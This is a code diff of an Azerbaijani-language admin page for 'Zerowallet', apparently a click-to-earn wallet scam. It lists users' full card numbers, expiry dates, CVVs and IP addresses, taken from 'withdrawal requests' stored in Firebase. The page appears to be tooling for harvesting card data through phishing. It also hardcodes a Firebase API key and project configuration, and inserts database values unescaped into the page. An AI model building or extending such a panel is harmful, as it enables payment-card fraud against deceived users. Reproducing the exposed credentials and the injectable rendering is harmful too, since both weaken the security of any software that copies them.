@@ -2,58 +2,165 @@
 <html lang="az">
 <head>
     <meta charset="UTF-8">
-    <title>Zerowallet - ADMIN PANEL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zerowallet | Admin Terminal v2.4</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
-        .block-btn { background: red; color: white; border: none; padding: 5px; cursor: pointer; }
+        :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
+        body { background: var(--bg); color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
+        
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { font-family: 'Courier New', monospace; color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; }
+        
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
+        .stat-card { background: var(--row-bg); padding: 20px; border-radius: 10px; border-left: 4px solid var(--neon); }
+        .stat-card h3 { margin: 0; font-size: 0.8rem; color: #888; }
+        .stat-card p { margin: 10px 0 0; font-size: 1.5rem; font-weight: bold; }
+
+        .table-wrap { background: var(--row-bg); border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 40px; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid #1c1c1f; }
+        tr:hover { background: #1a1a1d; }
+
+        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
+        .badge-card { background: #2c2c2e; color: #00f2ff; border: 1px solid #00f2ff; }
+        .badge-ip { background: #1a1a1a; color: #888; }
+
+        .btn { padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-block { background: #ff3e3e; color: white; }
+        .btn-block:hover { background: #ff0000; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
+        .btn-unblock { background: #00ff41; color: black; }
+
+        .card-data { color: #ffd700; font-family: 'Courier New', monospace; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>ADMIN CONTROL PANEL (v2.4)</h1>
-    
-    <h3>ÇIXARIŞ TƏLƏBLƏRİ VƏ KARTLAR</h3>
-    <table id="card-table">
-        <tr>
-            <th>İstifadəçi</th><th>Məbləğ</th><th>Ad Soyad</th><th>Kart No</th><th>Exp</th><th>CVV</th><th>IP</th><th>Əməliyyat</th>
-        </tr>
-    </table>
 
-    <script>
-        // Eyni Firebase Config-i bura da qoyun
-        const firebaseConfig = { ... }; 
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+<div class="container">
+    <h1><i class="fas fa-terminal"></i> ZEROWALLET_ADMIN_SYSTEM</h1>
 
-        // Kart məlumatlarını gətir
-        db.ref('admin_withdrawals').on('value', snap => {
-            const table = document.getElementById('card-table');
-            table.innerHTML = `<tr><th>İstifadəçi</th><th>Məbləğ</th><th>Ad Soyad</th><th>Kart No</th><th>Exp</th><th>CVV</th><th>IP</th><th>Əməliyyat</th></tr>`;
-            
-            snap.forEach(child => {
-                const d = child.val();
-                table.innerHTML += `
-                    <tr>
-                        <td>${d.username}</td>
-                        <td>${d.amount} AZN</td>
-                        <td>${d.cardName}</td>
-                        <td style="color:yellow">${d.cardNum}</td>
-                        <td>${d.cardExp}</td>
-                        <td>${d.cardCvv}</td>
-                        <td>${d.ip}</td>
-                        <td><button class="block-btn" onclick="blockIp('${d.ip}')">IP BLOKLA</button></td>
-                    </tr>`;
-            });
+    <div class="stats-grid">
+        <div class="stat-card"><h3>ÜMUMİ İSTİFADƏÇİ</h3><p id="total-users">0</p></div>
+        <div class="stat-card"><h3>ÖDƏNİŞ GÖZLƏYƏN</h3><p id="total-withdrawals">0</p></div>
+        <div class="stat-card" style="border-left-color: #ff3e3e;"><h3>BLOKLANMIŞ IP</h3><p id="total-blocked">0</p></div>
+    </div>
+
+    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ VƏ KARTLAR</h2>
+    <div class="table-wrap">
+        <table id="withdraw-table">
+            <thead>
+                <tr>
+                    <th>İstifadəçi</th>
+                    <th>Məbləğ</th>
+                    <th>Kart Sahibi</th>
+                    <th>Kart Məlumatları (No/Tarix/CVV)</th>
+                    <th>IP Ünvanı</th>
+                    <th>Tarix</th>
+                    <th>Əməliyyat</th>
+                </tr>
+            </thead>
+            <tbody id="withdraw-body">
+                </tbody>
+        </table>
+    </div>
+
+    <h2><i class="fas fa-users"></i> BÜTÜN İSTİFADƏÇİLƏR</h2>
+    <div class="table-wrap">
+        <table id="user-table">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Balans</th>
+                    <th>Klik</th>
+                    <th>IP</th>
+                    <th>Status</th>
+                    <th>İdarəetmə</th>
+                </tr>
+            </thead>
+            <tbody id="user-body">
+                </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
+        authDomain: "sevgili-testi.firebaseapp.com",
+        databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
+        projectId: "sevgili-testi",
+        storageBucket: "sevgili-testi.firebasestorage.app",
+        messagingSenderId: "399260477557",
+        appId: "1:399260477557:web:584204a698d7bf145bb03c"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 1. Çıxarışları və Kartları İzlə
+    db.ref('admin_withdrawals').on('value', snap => {
+        const body = document.getElementById('withdraw-body');
+        body.innerHTML = '';
+        let count = 0;
+        snap.forEach(child => {
+            const d = child.val();
+            count++;
+            body.innerHTML += `
+                <tr>
+                    <td><b>${d.username}</b></td>
+                    <td style="color:#00ff41">${d.amount.toFixed(2)} AZN</td>
+                    <td>${d.card_name}</td>
+                    <td class="card-data">${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td>
+                    <td><span class="badge badge-ip">${d.ip}</span></td>
+                    <td>${new Date(d.timestamp).toLocaleString()}</td>
+                    <td><button class="btn btn-block" onclick="blockIp('${d.ip}')">IP BLOKLA</button></td>
+                </tr>`;
         });
+        document.getElementById('total-withdrawals').innerText = count;
+    });
 
-        function blockIp(ip) {
-            const cleanIp = ip.replace(/\./g, '_');
-            db.ref('blocked_ips/' + cleanIp).set(true);
-            alert(ip + " ünvanı bloklandı!");
+    // 2. Bütün İstifadəçiləri İzlə
+    db.ref('zerowallet_users').on('value', snap => {
+        const body = document.getElementById('user-body');
+        body.innerHTML = '';
+        let count = 0;
+        snap.forEach(child => {
+            const u = child.val();
+            count++;
+            body.innerHTML += `
+                <tr>
+                    <td>${u.username}</td>
+                    <td>${u.balance.toFixed(2)} AZN</td>
+                    <td>${u.clicks}/15</td>
+                    <td>${u.ip}</td>
+                    <td>${u.lastReset > 0 ? '<span style="color:orange">Gözləmədə</span>' : '<span style="color:green">Aktiv</span>'}</td>
+                    <td>
+                        <button class="btn btn-block" onclick="blockIp('${u.ip}')">Blokla</button>
+                    </td>
+                </tr>`;
+        });
+        document.getElementById('total-users').innerText = count;
+    });
+
+    // 3. Bloklanmış IP-ləri İzlə
+    db.ref('blocked_ips').on('value', snap => {
+        document.getElementById('total-blocked').innerText = snap.numChildren();
+    });
+
+    // IP Bloklama Funksiyası
+    function blockIp(ip) {
+        if(!ip) return;
+        const cleanIp = ip.replace(/\./g, '_');
+        if(confirm(ip + " ünvanını bloklamaq istədiyinizə əminsiniz?")) {
+            db.ref('blocked_ips/' + cleanIp).set({
+                ip: ip,
+                blockedAt: Date.now()
+            }).then(() => alert("IP uğurla bloklandı."));
         }
-    </script>
+    }
+</script>
 </body>
 </html>
